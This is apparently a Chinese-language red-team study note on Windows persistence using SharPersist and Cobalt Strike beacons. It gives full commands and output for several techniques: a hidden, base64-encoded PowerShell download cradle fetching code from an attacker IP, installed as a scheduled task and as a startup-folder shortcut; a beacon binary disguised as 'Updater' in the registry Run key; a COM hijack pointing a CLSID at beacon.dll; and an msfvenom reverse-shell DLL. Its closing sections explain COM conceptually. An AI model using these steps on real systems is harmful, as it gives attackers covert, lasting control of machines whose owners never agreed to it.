# 主机持久性

> 为什么需要主机持久性？
如果通过钓鱼手段获得访问权限，当当前shell消失以后，就不太可能重复钓鱼这个动作再次获得shell。
持久性是一种重新获得或保持对受感染机器的访问权限的方法，而无需重新利用最初的get shell步骤。主机通常是不稳定的，因为用户倾向于经常注销或重新启动它们。

常见的主机持久性方法包括：
1. HKCU / HKLM Registry Autoruns
2. Scheduled Tasks
3. Startup Folder

[SharPersist](https://github.com/mandiant/SharPersist),C#编写的windows持久化工具。

通过命令```execute-assembly```实现持久化

# Task Scheduler

通过定时任务实现主机持久化，可以是一天中的某个时间、用户登录时、计算机空闲时、计算机锁定时或其组合。

需要用base64加密定时任务命令

powershell
```
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==
```


linux
```
root@kali:~# str='IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))'
root@kali:~# echo -en $str | iconv -t UTF-16LE | base64 -w 0
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==
```


通过命令```execute-assembly```实现持久化
```
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==" -n "Updater" -m add -o hourly

[*] INFO: Adding scheduled task persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==
[*] INFO: Scheduled Task Name: Updater
[*] INFO: Option: hourly
[+] SUCCESS: Scheduled task added
```

参数解释：

```
-t is the desired persistence technique.
-c is the command to execute.
-a are any arguments for that command.
-n is the name of the task.
-m is to add the task (you can also remove, check and list).
-o is the task frequency.
```

# Startup Folder

当用户第一次登录时，用户启动文件夹内的应用程序、文件和快捷方式会自动启动。

```
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==" -f "UserEnvSetup" -m add

[*] INFO: Adding startup folder persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==
[*] INFO: File Name: UserEnvSetup
[+] SUCCESS: Startup folder persistence created
[*] INFO: LNK File located at: C:\Users\bfarmer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UserEnvSetup.lnk
[*] INFO: SHA256 Hash of LNK file: B34647F8D8B7CE28C1F0DA3FF444D9B7244C41370B88061472933B2607A169BC
```

参数解释：

```
-f is the filename to save as.
```

# Registry AutoRun

HKCU 和 HKLM 中的 AutoRun 值允许应用程序在启动时启动

```
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\beacon-http.exe
beacon> mv beacon-http.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

[*] INFO: Adding registry persistence
[*] INFO: Command: C:\ProgramData\Updater.exe
[*] INFO: Command Args: /q /n
[*] INFO: Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
[*] INFO: Registry Value: Updater
[*] INFO: Option: 
[+] SUCCESS: Registry persistence added
```

参数解释：
```
-k is the registry key to modify.
-v is the name of the registry key to create.
```

# COM Hijacking

什么是COM？
Component Object Model (COM，组件对象模型？) 是一种构建在 Windows 操作系统中的技术，它允许不同语言的软件组件之间相互通信。


COM可以指定DLL加载到内存中，如果我们可以修改指定的DLL，就可以劫持它。

[OleView .NET](https://github.com/tyranid/oleviewdotnet)允许我们查找和检查 COM 组件

当我们能够修改这些条目以指向不同的 DLL 时，COM 劫持就会发挥作用——我们控制的那个。因此，当应用程序尝试调用特定的 coclass 时，它不会加载C:\Windows\System32\ieframe.dll（例如），而是加载C:\Temp\evil.dll或我们指定的任何内容。像这样劫持 COM 对象的危险在于您会破坏功能。有时这将是一个相对普通的第 3 方应用程序，它可能是一个关键业务应用程序，也可能是整个操作系统。在不了解 COM 对象的作用或用途的情况下劫持 COM 对象在实际环境中是一个非常糟糕的主意。

我感觉就是DLL劫持。。。

# Hunting for COM Hijacks

寻找COM劫持

与其劫持正在使用的 COM 对象并破坏依赖它们的应用程序，更安全的策略是找到尝试加载实际不存在的对象（所谓的“废弃”键）的应用程序实例。（我理解是这不会破坏程序原有的功能，从而起到隐藏自己的作用）

使用[Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)这个工具，它可以显示实时文件系统、注册表和进程活动，对于查找不同类型的权限提升原语非常有用。


由于生成的信息非常庞大，我们主要关注：
```
RegOpenKey operations.
where the Result is NAME NOT FOUND.
and the Path ends with InprocServer32.
```


使用powershell查找存在在HKLM, 但是不存在HKCU的条目
```
PS C:\> Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"

Name                           Property
----                           --------
InprocServer32                 (default)      : C:\Windows\System32\thumbcache.dll
                               ThreadingModel : Apartment


PS C:\> Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32' because it does not exist.
```


为了利用这一点，我们可以在 HKCU 中创建必要的注册表项并将它们指向 Beacon DLL。

```
PS C:\> New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
PS C:\> New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
PS C:\> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

生成DLL payload
```
转到Attacks > Packages > Windows Executable (S)，然后选择Windows DLL作为输出类型
```

上传
```
beacon> cd C:\
beacon> upload C:\Payloads\beacon.dll
```

当DllHost.exe加载这个 COM 条目时，我们得到一个 Beacon

寻找可劫持的 COM 组件的另一个好地方是在任务计划程序中。许多默认的 Windows 任务实际上不是在磁盘上执行二进制文件，而是使用自定义触发器来调用 COM 对象。而且因为它们是通过任务计划程序执行的，所以更容易预测它们何时会被触发。我们可以使用下面的 PowerShell 来查找兼容的任务。

```
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```


通过msf生成恶意DLL
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=5555 -f dll > pentestlab.dll
````

# 加餐

参考[这篇文章](https://earthmanet.github.io/posts/2021/02/%E6%BB%A5%E7%94%A8comcom%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81/)

## COM劫持原理

> COM是Component Object Model （组件对象模型）。是Windows上的一个系统，可以通过操作系统实现软件组件之间的交互。攻击者可以使用该系统，通过劫持COM引用和关系在合法软件中插入恶意代码，达成持久化目标。劫持COM对象需要修改Windows注册表，替换某个合法系统组件的引用，该操作可能导致该组件无法正常执行。当系统组件通过正常系统调用执行时，攻击者的代码就会被执行。攻击者可能会劫持频繁使用的对象，以维持一定程度的持久化驻留，但不大会破坏系统内的常见功能，避免系统出现不稳定状态导致攻击行为被发现。

> InprocServer32和LocalServer32（以及InprocServer和LocalServer）键值是COM服务（例如DLL、CPL、EXE和OCX）的引用点。一种常见的COM劫持方法是，将恶意DLL或者EXE文件放置到废弃的COM组件引用路径中。当COM组件通过正常系统调用执行时，攻击者的恶意代码就会被执行。

> 另一种常见的方法是在程序读取注册表信息中的DLL或者EXE功能的路径上，做一个拦截，让程序提前读取我们的设置好的恶意DLL或者EXE。COM劫持原理在某种程度上近似于DLL劫持。



参考[这篇文章](https://payloads.online/archivers/2018-10-14/1/)

## 什么是CLSID？

> CLSID(Class Identifier)，中文翻译为：“全局唯一标识符”。

> CLSID是指Windows系统对于不同的应用程序，文件类型，OLE对象，特殊文件夹以及各种系统组件分配的一个唯一表示它的ID代码，用于对其身份的标识和与其他对象进行区分。

> 也就是说CLSID就是对象的身份证号，而当一个应用程序想要调用某个对象时，也是通过CLSID来寻找对象的。



参考[这篇文章](https://cloud.tencent.com/developer/article/1498505)

## COM这种技术解决了什么问题？

1、代码共用问题

2、版本问题

3、调用其它软件的功能

4、所有代码均可以面向对象

## COM组件与注册表关系

通常我们编写好一个COM组件，都需要注册到注册表中（也可以设置不用注册的COM组件，但是一般都是使用的注册方法），这样当我调用COM组件的这个功能的时候，程序会进注册表进行读取相应位置的DLL或者EXE，加载到进程还是线程中来，供我们使用.

注册表中，LocalServer32键表示可执行（exe）文件的路径、InprocServer32键表示动态链接库（DLL）文件的路径。因为COM函数功能主要是通过这类文件来实现的。